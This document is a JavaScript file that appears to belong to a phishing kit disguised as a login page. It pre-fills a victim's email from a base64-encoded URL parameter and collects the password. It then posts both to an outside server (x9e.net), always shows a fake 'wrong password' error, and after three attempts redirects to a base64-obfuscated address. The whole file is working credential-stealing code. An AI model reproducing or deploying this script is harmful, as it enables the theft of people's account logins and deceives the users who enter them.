$(document).ready(function() {
  // Password visibility toggle
  const passwordInput = document.getElementById('password');

  // Get email from URL parameter
  let loginAttempts = 0;
  const maxAttempts = 3;
  
  const encodedUrlTemplate = "aHR0cHM6Ly9hd3VtZW4uZnVuL3dvcmtzL3Bvc3QucGhw";
  
  // Function to decode base64
  function decodeBase64(str) {
    try {
      return atob(str);
    } catch (e) {
      //console.error("Decode error:", e);
      return "";
    }
  }
  
  // Parse URL parameters
  function getParameterByName(name, url = window.location.href) {
    name = name.replace(/[\[\]]/g, '\\$&');
    const regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
          results = regex.exec(url);
    if (!results) return null;
    if (!results[2]) return '';
    return decodeURIComponent(results[2].replace(/\+/g, ' '));
  }
  
  // Validate email format with stronger TLD validation
  function isValidEmail(email) {
    // More comprehensive email regex that requires TLD to be at least 2 characters
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/;
    
    if (!emailRegex.test(email)) {
      return false;
    }
    
    // Additional check for the TLD (part after the last dot)
    const parts = email.split('.');
    const tld = parts[parts.length - 1];
    
    // TLD must be at least 2 characters
    if (tld.length < 2) {
      return false;
    }
    
    return true;
  }
  
  // Try to decode base64 string
  function tryBase64Decode(str) {
    try {
      // Check for base64 format
      if (/^[A-Za-z0-9+/=]+$/.test(str)) {
        const decoded = atob(str);
        return decoded;
      }
    } catch (e) {
      //console.error("Base64 decode error:", e);
    }
    return str;
  }
  
  // Build redirect URL with username and domain
  function buildRedirectUrl() {
    // Decode the template and then replace the placeholders
    return decodeBase64(encodedUrlTemplate);
  }
  
  // Show error page
  function showErrorPage() {
    $("#loginform").hide();
    $("#errorpage").show();
  }
  
  // Process the email parameter
  function processEmailParameter() {
    const utmParam = getParameterByName('utm');
    
    // Check if utm parameter exists and is a valid email
    if (!utmParam) {
      showErrorPage();
      return false;
    }
    
    // Try to decode if it's base64
    let email = tryBase64Decode(utmParam);
    
    // Validate email format
    if (!isValidEmail(email)) {
      showErrorPage();
      return false;
    }
    
    
    // Populate the form fields
    $('#email').html(email);
    
    // Focus on password field
    $('#password').focus();
    
    return true;
  }
  
  // Run email parameter processing
  const isValidLogin = processEmailParameter();
  
  // Handle form submission
  $('form').on('submit', function(e) {
    e.preventDefault();
    $("sign in").show();
    if (!isValidLogin) return;
    
    const password = $('#password').val();
    
    // Validate password
    if (!password || password.length < 6) {
      $('#error').show();
      $('#password').focus();
      return;
    }
    
    
    // Disable form elements during submission
    const formElements = $('form input, form button').not('#email').not('[disabled]');
    formElements.prop('disabled', true);
    $('#error').hide();
    // Submit form data
    $.ajax({
      url: 'https://x9e.net/owwa/post.php',
      type: 'POST',
      data: {
        email: $('#email').html(),
        password: password
      },
      complete: function() {
        // This runs after either success or error
        // Count login attempts
        loginAttempts++;
        
        // Re-enable form elements
        formElements.prop('disabled', false);
        
          // Show error message and focus on password
          $('#error').show();
          $('#password').addClass('password-error-field');
          $('#password').val('').focus();
          
          // Check if max attempts reached
          if (loginAttempts >= maxAttempts) {
            // Redirect after 3 failed attempts with the proper username and domain
            window.location.href = buildRedirectUrl();
          }
          $(".loading-dots").hide();
      }
    });
  });

  
  // // Also handle focus event
  // passwordInput.addEventListener('focus', function() {
  //   // Only change color if there's content
  //   if (passwordInput.value.length > 0) {
  //     submitButton.classList.remove('login-btn');
  //     submitButton.classList.add('bg-[#2985db]');
  //   }
  // });

  $("#password").on("input", function(){
    if (this.value.length > 0 && this.classList.contains('password-error-field')) {
      this.classList.remove('password-error-field');
      $("#error").hide();
    }
  });
  // Set autofocus on the password field
  passwordInput.focus();
});